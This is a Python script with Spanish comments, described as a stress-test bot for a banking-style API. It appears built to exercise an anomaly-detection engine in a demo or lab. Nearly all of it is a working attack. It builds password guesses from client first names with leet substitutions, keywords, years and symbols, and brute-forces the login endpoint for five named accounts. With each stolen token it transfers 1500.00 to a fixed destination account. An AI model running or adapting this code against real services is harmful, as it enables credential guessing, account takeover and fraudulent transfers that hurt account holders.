"""
Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
-------------------------------------------------------------------------
Descripción: Realiza pruebas de autenticación heurística y ejecuta 
             transferencias simuladas contra la API, enviando telemetría
             biométrica al motor BGG para validar detección de anomalías.
VERSIÓN:     1.2 (Soporte multicliente con telemetría BGG)
=========================================================================
"""

import requests
import time

# ==========================================
# CONFIGURACIÓN DE ENDPOINTS Y RED
# ==========================================
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"

LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"
PREDICT_URL = f"{API_BASE}/api/v1/predict"

TARGET_USERS = ["cliente_003", "cliente_004", "cliente_005", "cliente_006", "cliente_007"]

HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# ==========================================
# DICCIONARIO Y PATRONES HEURÍSTICOS
# ==========================================
KNOWN_CREDENTIALS = {}

CLIENT_NAME_MAP = {
    "cliente_003": "Sofia",
    "cliente_004": "Javier",
    "cliente_005": "Lucia",
    "cliente_006": "Daniel",
    "cliente_007": "Valentina"
}

CONTEXT_KEYWORDS = ["Segura", "Bank", "Clave", "Pass", "Banco"]
YEARS = ["25", "99", "7", "456", "88", "2026"]
SYMBOLS = ["#", "$", "_"]

def generate_passwords_for_user(username: str) -> list[str]:
    first_name = CLIENT_NAME_MAP.get(username, "User")
    generated = set()
    
    leet_name = (
        first_name
        .replace('i', '1')
        .replace('e', '3')
        .replace('o', '0')
    )
    
    for word in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                generated.add(f"{leet_name}{sym}{word}{yr}")
                generated.add(f"{leet_name}_{word}{sym}{yr}")
                generated.add(f"{leet_name}{yr}!")
                generated.add(f"{leet_name}123")

    return list(generated)

def run_api_bot():
    print("🤖 [BOT API] Iniciando batería de pruebas multicliente con telemetría BGG...\n")

    for target_user in TARGET_USERS:
        print("==================================================")
        print(f"🎯 Evaluando usuario objetivo: {target_user}")
        print("==================================================")

        if target_user in KNOWN_CREDENTIALS:
            valid_password = KNOWN_CREDENTIALS[target_user]
            print(f"⚡ [CACHÉ LOG] Contraseña conocida en memoria: '{valid_password}'")
            execute_login_and_transfer(target_user, valid_password)
            continue
        
        candidates = generate_passwords_for_user(target_user)
        print(f"🔍 Contraseña no registrada. Probando {len(candidates)} candidatos heurísticos...\n")

        success = False
        for attempt, pwd in enumerate(candidates, 1):
            
            # 1. Enviar telemetría de Bot al motor de IA (BGG)
            telemetria_payload = {
                "status_code": 401,
                "latency": 15.0,      # Latencia baja típica de script (ms)
                "user_speed": 0.01    # Tiempo entre pulsaciones (segundos) -> Inhumano
            }

            try:
                ia_resp = requests.post(PREDICT_URL, json=telemetria_payload, headers=HEADERS, timeout=5)
                if ia_resp.status_code == 200:
                    data_ia = ia_resp.json()
                    if data_ia.get("bloquear") is True or data_ia.get("codigo_http") == 403:
                        print(f"⛔ [INTENTO {attempt}] ¡BOT BLOQUEADO POR BGG! (Score: {data_ia.get('anomaly_score'):.4f})")
                        print(f"🛡️ Mensaje IA: {data_ia.get('mensaje')}")
                        print("🛑 Abortando ráfaga para este usuario por detección de anomalía.\n")
                        break
            except Exception as e:
                print(f"⚠️ No se pudo consultar la API de IA: {e}")

            # 2. Intento de Login en el backend
            login_payload = {"username": target_user, "password": pwd}
            try:
                response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ [Intento {attempt}] ¡Contraseña identificada!: '{pwd}'")
                    KNOWN_CREDENTIALS[target_user] = pwd
                    execute_login_and_transfer(target_user, pwd, response.json())
                    success = True
                    break
                else:
                    print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> '{pwd}'")
            
            except Exception as e:
                print(f"⚠️ Error de conexión en login: {e}")

            time.sleep(0.1)

        if not success:
            print(f"❌ Finalizado para {target_user}: Operación detenida o sin acceso.\n")

def execute_login_and_transfer(username, password, login_data=None):
    if not login_data:
        resp = requests.post(LOGIN_URL, json={"username": username, "password": password}, headers=HEADERS)
        login_data = resp.json()

    headers_tx = HEADERS.copy()
    token = login_data.get("token") or login_data.get("access_token")
    if token:
        headers_tx["Authorization"] = f"Bearer {token}"

    source_account = login_data.get("account_id", f"MX-4821-{username.split('_')[-1]}")
    transfer_payload = {
        "account_id": source_account,
        "destination_account": "MX-9012-3344",
        "amount": 1500.00
    }

    print(f"💸 Ejecutando transferencia con sesión validada: {transfer_payload}")
    try:
        tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
        print(f"📊 Respuesta Transferencia: HTTP {tx_resp.status_code}\n")
    except Exception as e:
        print(f"⚠️ Error ejecutando transferencia: {e}\n")

if __name__ == "__main__":
    run_api_bot()